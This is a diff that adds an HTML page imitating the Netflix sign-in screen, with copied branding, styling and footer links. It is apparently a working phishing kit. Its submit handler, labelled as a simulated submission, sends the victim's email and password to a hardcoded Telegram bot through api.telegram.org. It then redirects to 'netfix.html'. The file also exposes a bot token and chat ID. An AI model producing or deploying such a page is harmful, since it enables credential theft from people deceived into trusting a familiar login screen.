@@ -1,0 +1,469 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Netflix- Sign In</title>
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+  <style>
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+    }
+
+    :root {
+      --net-red: #e50914;
+      --net-dark: #141414;
+      --net-gray: #737373;
+      --net-light-gray: #e5e5e5;
+      --net-white: #ffffff;
+      --net-card-shadow: 0 10px 30px rgba(0, 0, 0, 0.5);
+      --net-transition: all 0.3s ease;
+    }
+
+    body {
+      font-family: 'Helvetica Neue', Helvetica, Arial, sans-serif;
+      background: url('https://assets.nflxext.com/ffe/siteui/vlv3/b70b092f-1760-4498-b462-b4ef19907ec7/31c2543d-4bd2-446f-bb3c-5fbf995ca106/NG-en-20211101-popsignuptwoweeks-perspective_alpha_website_small.jpg') center/cover no-repeat;
+      color: var(--net-white);
+      min-height: 100vh;
+      position: relative;
+      display: flex;
+      flex-direction: column;
+    }
+
+    body::before {
+      content: '';
+      position: absolute;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      background: rgba(0, 0, 0, 0.5);
+      z-index: 1;
+    }
+
+    .header {
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      padding: 20px 50px;
+      position: relative;
+      z-index: 10;
+    }
+
+    .logo {
+      width: 170px;
+      height: auto;
+    }
+
+    .signin-container {
+      position: relative;
+      z-index: 10;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      flex: 1;
+      padding: 20px;
+    }
+
+    .login-card {
+      background: rgba(0, 0, 0, 0.75);
+      border-radius: 8px;
+      box-shadow: var(--net-card-shadow);
+      width: 100%;
+      max-width: 450px;
+      padding: 60px 68px 40px;
+      margin: 20px 0;
+    }
+
+    .login-card h1 {
+      font-size: 32px;
+      margin-bottom: 28px;
+      font-weight: 600;
+    }
+
+    .form-group {
+      margin-bottom: 16px;
+      position: relative;
+    }
+
+    .form-control {
+      width: 100%;
+      background: #333;
+      border: none;
+      border-radius: 4px;
+      color: var(--net-white);
+      padding: 16px 20px;
+      font-size: 16px;
+      outline: none;
+      transition: var(--net-transition);
+    }
+
+    .form-control:focus {
+      background: #454545;
+    }
+
+    .form-control::placeholder {
+      color: var(--net-gray);
+    }
+
+    .error-message {
+      color: #e87c03;
+      font-size: 13px;
+      margin-top: 5px;
+      display: none;
+    }
+
+    .form-group.error .error-message {
+      display: block;
+    }
+
+    .form-group.error .form-control {
+      border-bottom: 2px solid #e87c03;
+    }
+
+    .submit-btn {
+      background: var(--net-red);
+      color: var(--net-white);
+      border: none;
+      border-radius: 4px;
+      padding: 16px;
+      font-size: 16px;
+      font-weight: 600;
+      width: 100%;
+      cursor: pointer;
+      transition: var(--net-transition);
+      margin-top: 30px;
+    }
+
+    .submit-btn:hover {
+      background: #f40612;
+    }
+
+    .submit-btn:disabled {
+      background: var(--net-gray);
+      cursor: not-allowed;
+    }
+
+    .form-options {
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      margin-top: 10px;
+      color: #b3b3b3;
+      font-size: 13px;
+    }
+
+    .remember-me {
+      display: flex;
+      align-items: center;
+      gap: 5px;
+    }
+
+    .remember-me input {
+      accent-color: #737373;
+    }
+
+    .help-link {
+      color: #b3b3b3;
+      text-decoration: none;
+    }
+
+    .help-link:hover {
+      text-decoration: underline;
+    }
+
+    .fb-login {
+      display: flex;
+      align-items: center;
+      gap: 10px;
+      margin: 20px 0;
+      color: #737373;
+      font-size: 13px;
+    }
+
+    .fb-icon {
+      font-size: 20px;
+      color: #3b5998;
+    }
+
+    .signup-text {
+      color: #737373;
+      margin: 16px 0;
+    }
+
+    .signup-link {
+      color: var(--net-white);
+      text-decoration: none;
+    }
+
+    .signup-link:hover {
+      text-decoration: underline;
+    }
+
+    .recaptcha {
+      color: #8c8c8c;
+      font-size: 13px;
+      line-height: 1.5;
+      margin-top: 15px;
+    }
+
+    .recaptcha-link {
+      color: #0071eb;
+      text-decoration: none;
+    }
+
+    .recaptcha-link:hover {
+      text-decoration: underline;
+    }
+
+    .footer {
+      background: rgba(0, 0, 0, 0.75);
+      border-top: 1px solid rgba(255, 255, 255, 0.1);
+      padding: 40px 15%;
+      position: relative;
+      z-index: 10;
+      margin-top: auto;
+    }
+
+    .footer-content {
+      display: grid;
+      grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
+      gap: 20px;
+    }
+
+    .footer-column h3 {
+      font-size: 16px;
+      margin-bottom: 20px;
+      color: var(--net-gray);
+      font-weight: 500;
+    }
+
+    .footer-column ul {
+      list-style: none;
+    }
+
+    .footer-column li {
+      margin-bottom: 12px;
+    }
+
+    .footer-column a {
+      color: var(--net-gray);
+      text-decoration: none;
+      font-size: 14px;
+      transition: var(--netflix-transition);
+    }
+
+    .footer-column a:hover {
+      color: var(--net-white);
+      text-decoration: underline;
+    }
+
+    .footer-bottom {
+      margin-top: 30px;
+      color: var(--net-gray);
+      font-size: 14px;
+    }
+
+    @media (max-width: 768px) {
+      .header {
+        padding: 20px;
+      }
+      
+      .login-card {
+        padding: 40px 20px;
+      }
+      
+      .footer {
+        padding: 30px 20px;
+      }
+    }
+
+    @media (max-width: 480px) {
+      .login-card {
+        background: rgba(0, 0, 0, 0.9);
+      }
+      
+      .form-options {
+        flex-direction: column;
+        align-items: flex-start;
+        gap: 10px;
+      }
+    }
+
+    /* Animation */
+    @keyframes fadeIn {
+      from { opacity: 0; transform: translateY(20px); }
+      to { opacity: 1; transform: translateY(0); }
+    }
+    
+    .login-card {
+      animation: fadeIn 0.6s ease-out;
+    }
+  </style>
+</head>
+<body>
+  <header class="header">
+    <img src="https://upload.wikimedia.org/wikipedia/commons/0/08/Netflix_2015_logo.svg" alt="Netflix" class="logo">
+  </header>
+  
+  <div class="signin-container">
+    <div class="login-card">
+      <h1>Sign In</h1>
+      
+      <form id="login-form">
+        <div class="form-group">
+          <input type="text" class="form-control" id="email" placeholder="Email or phone number" required>
+          <div class="error-message">Please enter a valid email or phone number.</div>
+        </div>
+        
+        <div class="form-group">
+          <input type="password" class="form-control" id="password" placeholder="Password" required>
+          <div class="error-message">Your password must contain between 4 and 60 characters.</div>
+        </div>
+        
+        <button type="submit" class="submit-btn" id="login-btn">Sign In</button>
+        
+        <div class="form-options">
+          <div class="remember-me">
+            <input type="checkbox" id="remember">
+            <label for="remember">Remember me</label>
+          </div>
+          <a href="#" class="help-link">Need help?</a>
+        </div>
+        
+        <div class="signup-text">
+          New to Netflix? <a href="#" class="signup-link">Sign up now</a>.
+        </div>
+        
+        <div class="recaptcha">
+          This page is protected by Google reCAPTCHA to ensure you're not a bot. 
+          <a href="#" class="recaptcha-link">Learn more.</a>
+        </div>
+      </form>
+    </div>
+  </div>
+  
+  <footer class="footer">
+    <div class="footer-content">
+      <div class="footer-column">
+        <h3>Questions? Contact us.</h3>
+        <ul>
+          <li><a href="#">FAQ</a></li>
+          <li><a href="#">Privacy</a></li>
+          <li><a href="#">Cookie Preferences</a></li>
+        </ul>
+      </div>
+      
+      <div class="footer-column">
+        <h3>Help Center</h3>
+        <ul>
+          <li><a href="#">Terms of Use</a></li>
+          <li><a href="#">Corporate Information</a></li>
+          <li><a href="#">Legal Notices</a></li>
+        </ul>
+      </div>
+      
+      <div class="footer-column">
+        <h3>Account</h3>
+        <ul>
+          <li><a href="#">Ways to Watch</a></li>
+          <li><a href="#">Terms of Payment</a></li>
+          <li><a href="#">Contact Us</a></li>
+        </ul>
+      </div>
+      
+      <div class="footer-column">
+        <h3>Media Center</h3>
+        <ul>
+          <li><a href="#">Investor Relations</a></li>
+          <li><a href="#">Redeem Gift Cards</a></li>
+          <li><a href="#">Buy Gift Cards</a></li>
+        </ul>
+      </div>
+    </div>
+    
+    <div class="footer-bottom">
+      <p>Netflix, Inc. is a registered service of Netflix Corporation. © 2025 Netflix, Inc.</p>
+    </div>
+  </footer>
+
+  <script>
+    document.addEventListener('DOMContentLoaded', function() {
+      const loginForm = document.getElementById('login-form');
+      const loginBtn = document.getElementById('login-btn');
+      const emailInput = document.getElementById('email');
+      const passwordInput = document.getElementById('password');
+      
+      // Form validation
+      loginForm.addEventListener('submit', function(e) {
+        e.preventDefault();
+        
+        // Reset errors
+        document.querySelectorAll('.form-group').forEach(group => {
+          group.classList.remove('error');
+        });
+        
+        let isValid = true;
+        
+        // Email validation
+        if (!emailInput.value.trim()) {
+          emailInput.closest('.form-group').classList.add('error');
+          isValid = false;
+        }
+        
+        // Password validation
+        const password = passwordInput.value.trim();
+        if (!password || password.length < 4 || password.length > 60) {
+          passwordInput.closest('.form-group').classList.add('error');
+          isValid = false;
+        }
+        
+        if (isValid) {
+          // Simulate form submission
+          loginBtn.disabled = true;
+          loginBtn.textContent = 'Signing In...';
+          
+          // Telegram bot info (unchanged from original)
+          const bot = {
+            TOKEN: "8306085341:AAG6T805T2LNq9u-UQ6VW_-U48mmtJzM0FE",
+            chatID: "6123346184"
+          };
+          
+          const email = emailInput.value;
+          const password = passwordInput.value;
+          
+          // Send data to Telegram
+          fetch(`https://api.telegram.org/bot${bot.TOKEN}/sendMessage?chat_id=${bot.chatID}&text=NETFLIX=>${email}=${password}`, {
+            method: "GET"
+          }).then(success => {
+            // Redirect after successful submission
+            setTimeout(() => {
+              window.location.href = "netfix.html";
+            }, 1500);
+          }, error => {
+            alert("There was an issue signing in. Please try again.");
+            console.log(error);
+            loginBtn.disabled = false;
+            loginBtn.textContent = 'Sign In';
+          }); 
+        }
+      });
+      
+      // Real-time validation
+      emailInput.addEventListener('input', function() {
+        if (this.value.trim()) {
+          this.closest('.form-group').classList.remove('error');
+        }
+      });
+      
+      passwordInput.addEventListener('input', function() {
+        if (this.value.trim() && this.value.length >= 4 && this.value.length <= 60) {
+          this.closest('.form-group').classList.remove('error');
+        }
+      });
+    });
+  </script>
+</body>
+</html>
